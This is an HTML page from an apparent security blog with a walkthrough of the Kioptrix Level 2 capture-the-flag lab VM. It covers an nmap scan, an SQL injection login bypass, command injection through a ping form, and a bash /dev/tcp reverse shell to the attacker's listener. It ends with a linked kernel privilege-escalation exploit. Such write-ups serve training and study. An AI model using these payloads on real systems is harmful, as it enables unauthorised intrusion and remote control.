@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Let us discuss about security">
+    <meta name="author" content="3kara &lt;adm1n.3kara@protonmail.com&gt;">
+    <meta name="twitter:card" content="summary" /> <!--Page Cover-->
+    
+    <title>Vulnhub Kioptrix Level 2 - 3kara</title> 
+    
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.1/css/all.css" integrity="sha384-xxzQGERXS00kBmZW/6qxqJPyxW3UR0BPsL4c8ILaIWXva5kFi7TxkIIaMiKtqV1Q" crossorigin="anonymous">
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+    <link rel="stylesheet" href="/css/style.css">
+
+</head>
+
+<body>
+    <a href="javascript:" id="rtt"><i class="fas fa-chevron-up"></i></a>
+    <div class="bg-gradient"></div>
+    <div class="bg-pattern"></div>
+    
+    <!--Menu Links and Overlay-->
+    <div class="menu-bg">
+        <div class="menu-container">
+            <ul>
+                <li class="menu-item"><a href="/">Home</a></li>
+                <li class="menu-item"><a href="/api">API</a></li>
+                <li class="menu-item"><a href="/blog">Blog</a></li>
+                <li class="menu-item"><a href="/ics">ICS</a></li>
+                <li class="menu-item"><a href="/oscp">Oscp</a></li>
+                <li class="menu-item"><a href="/search">Search <i class="fas fa-search"></i></a>
+            </ul>
+        </div>
+    </div>
+    
+    <!--Hamburger Icon-->
+    <nav>
+        <a href="#menu"></a>
+    </nav>
+    
+    <div class="container">
+    
+        <!-- Main Content -->
+        <div class="row">
+        <div class="col-sm-12">
+    
+        <!--Title and Logo-->
+        <header>
+        <div class="logo">
+            <a href="/"><i class="logo-icon rotate linear infinite fas fa-dharmachakra" aria-hidden="true"></i></a>
+            <h1 id="main-title" class="title">Walkthrough</h1>
+        </div>
+        </header>
+    
+    <section class="main">
+                
+                     
+    <div class="post">
+    
+        <div class="post-header">
+            <h1 class="title"><a href="/oscp/walkthrough/vulnhub-kioptrix-level-2">Vulnhub - Kioptrix Level 2</a></h1>
+        </div>
+    
+        <div class="content">
+
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2>
+            <p>Kioptrix level 2 is the next level machine of kioptrix level 1 featuring the vulnerabilities SQL Injection, OS Command Injection and Privilege Escalation.</p>
+            <h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2>
+            <p>We imported the VM into Virtual Box and kept the network adapter in Bridged mode. Now we should identify the ip address of the VM to get started, so we will run a ping scan on IP range.</p>
+            <blockquote><p>kal@3kara:~$  sudo nmap -n -sn -vvv 192.168.1.0-255</p></blockquote>
+            <p>If you are not able to identify the target  IP then try out other options which are shown <a href="/oscp/information-gathering/identifying-targets">here.</a></p>
+            <p>Once we identify the target ip, we go ahead and run a simple service version scan on it.</p>
+            <div class="picture-container">
+                <a href="nmap" data-featherlight="/oscp/img/kl2/nmap.png">
+                    <img src="/oscp/img/kl2/nmap.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>That’s a lot of outdated services! Let’s go over each and find how we can exploit them. Some resources for identifying vulnerabilities and/or finding exploits for known services are mentioned <a href="/oscp/walkthrough/vulnhub-kioptrix-level-1#Vulnerability-Database">Here</a></p>
+            <p>We can see that the ports 80, 443 running an apache 2.0.52 with mysql running on 3306 port. So lets reduce the attack surface to these services.</p>
+            <p>As the mysql and apache are running, we can hope that the website hosted on apache is connected to back end database. We can confirm that by visiting the address to get the login form.</p>
+            <p>At this point, I assumed that the login page backend SQL Query looked similar to something like this:<blockquote>SELECT * FROM users WHERE username='' AND password=''</blockquote>Let’s go ahead and try injecting the following code in both the Username and Password fields.<blockquote>x' or 'x'='x</blockquote>And if we are correct, the backend SQL Query should look like the following:<blockquote>SELECT * FROM users WHERE username='x' or 'x'='x' AND password='x' or 'x'='x'</blockquote>This basically means that if Username = True and Password = True, then log us in.</p>
+            <div class="picture-container">
+                <a href="sqli" data-featherlight="/oscp/img/kl2/sqli.png">
+                    <img src="/oscp/img/kl2/sqli.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>Perfect! The SQL Injection worked and we are able to access the next page, which seems like a Ping Command prompt. We can test this Ping Command prompt by trying to ping our localhost (127.0.0.1).</p>
+            <div class="picture-container">
+                <a href="ping" data-featherlight="/oscp/img/kl2/ping.png">
+                    <img src="/oscp/img/kl2/ping.png" class="img-thumbnail" /></a>
+            </div><br>
+            <h2 id="esi"><a href="#esi" class="headerlink" title="esi"></a>Exploiting SQL Injection</h2>
+            <p>As the ping command works and the php code is executing system commands by appending the input to the "ping" command. let us complete the ping command and append with new command by giving <blockquote>127.0.0.1; id</blockquote></p>
+            <p>This basically tells the system to run ping against our localhost machine (127.0.0.1), then run the id command. Technically the “;” symbol is a command separator.</p>
+            <div class="picture-container">
+                <a href="pingid" data-featherlight="/oscp/img/kl2/pingid.png">
+                    <img src="/oscp/img/kl2/pingid.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>Great! the site is vulnerable to command injection and we want to get the shell, so let us start by setting up a NetCat listener<blockquote>kal@3kara:~$ sudo nc -nlvp 443</blockquote>Now, let's go get the reverse connection from the server.<blockquote>; bash -i >& /dev/tcp/192.168.1.6/443 0>&1</blockquote>This will basically initiate a reverse TCP connection using bash to the IP address of our machine (192.168.1.6 in my case on port 443).</p>
+            <div class="picture-container">
+                <a href="ls" data-featherlight="/oscp/img/kl2/ls.png">
+                    <img src="/oscp/img/kl2/ls.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>Awesome! We were able to connect to the victim’s machine, and it seems that we are currently running as the apache user. Our next step from here would be to carry out some Privilege Escalation to be able to get access to the root account.<br>Let’s start by seeing what version of Linux the system is running.</p>
+            <div class="picture-container">
+                <a href="kernel" data-featherlight="/oscp/img/kl2/kernel.png">
+                    <img src="/oscp/img/kl2/kernel.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>After a quick Google search against the Linux Versions I was able to find a Privilege Escalation exploit called <a href="https://www.exploit-db.com/exploits/9542">ip_append_data_() Ring0.</a><br>So, let’s go ahead and copy over the exploit script and then compile it!</p>
+            <div class="picture-container">
+                <a href="lpec" data-featherlight="/oscp/img/kl2/lpec.png">
+                    <img src="/oscp/img/kl2/lpec.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>We dont have permissions to write to the current directory. so we have to download it to the directory where we have write permissions .i.e, tmp directory.</p>
+            <div class="picture-container">
+                <a href="lped" data-featherlight="/oscp/img/kl2/lped.png">
+                    <img src="/oscp/img/kl2/lped.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>As we were able to download the exploit into kioptrix machine, now let us compile and execute to get the root shell.</p>
+            <div class="picture-container">
+                <a href="lpes" data-featherlight="/oscp/img/kl2/lpes.png">
+                    <img src="/oscp/img/kl2/lpes.png" class="img-thumbnail" /></a>
+            </div><br>
+
+        </div>
+
+    </div>
+                   
+    </section>
+    </div>
+    </div>
+   
+    </div>
+    
+    <!-- Footer -->
+    <div class="push"></div>
+    
+    <footer class="footer-content">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                    <h2><a href="#">About</a></h2>
+                    <p>3kara is the source for security concepts and information about Web, Mobile and API along with few Walkthroughs, Best practices, Cheatsheets, Custom Scripts, Tips & Techniques.</p>
+                    <p>Our goal is to spread enthusiasm, awareness and joy on information security as well as to document and share what we were able to learn  along the way.</p>
+                </div>
+                
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-contact">
+                    <h2>Contact</h2>
+                    <p>For queries, Contact us at adm1n.3kara@protonmail.com</p>
+                    <p>Stuck somewhere? Don't hesitate</p> 
+                    <p>Contact author directly by clicking on their name.</p>
+                </div>
+                
+    </div>
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                    <ul class="list-inline footer-social-icons">
+                        
+                        <li class="list-inline-item"><a href="https://3kara.github.com"><span class="footer-icon-container"><i class="fab fa-github"></i></span></a></li>
+                        <li class="list-inline-item"><a href="https://twitter.com/_3kara?lang=en"><span class="footer-icon-container"><i class="fab fa-twitter"></i></span></a></li>
+                        <li class="list-inline-item"><a href="https://t.me/i3kara"><span class="footer-icon-container"><i class="fab fa-telegram"></i></span></a></li>
+                        <li class="list-inline-item"><a href="mailto:adm1n.3kara@protonmail.com"><span class="footer-icon-container"><i class="far fa-envelope"></i></span></a></li>
+                        <li class="list-inline-item"><a href="https://discord.gg/4uuuqHp"><span class="footer-icon-container"><i class="fab fa-discord"></i></span></a></li>
+                                                                       
+                    </ul>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                    <div class="footer-copyright">
+                        All rights reserved &copy; 3kara <script>document.write(new Date().getFullYear());</script> You reap what you sow
+
+                    </div>
+                </div>
+            </div>
+        </div>
+       
+    </footer>
+     
+    <!-- After footer scripts -->
+    
+    <script src="//code.jquery.com/jquery-2.1.4.min.js"></script> <!-- jQuery -->    
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script> <!-- Tween Max --> 
+    <script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script> <!-- Gallery -->
+    <script src="/js/main.js"></script>
+    
+    </body>
+    
+    </html>
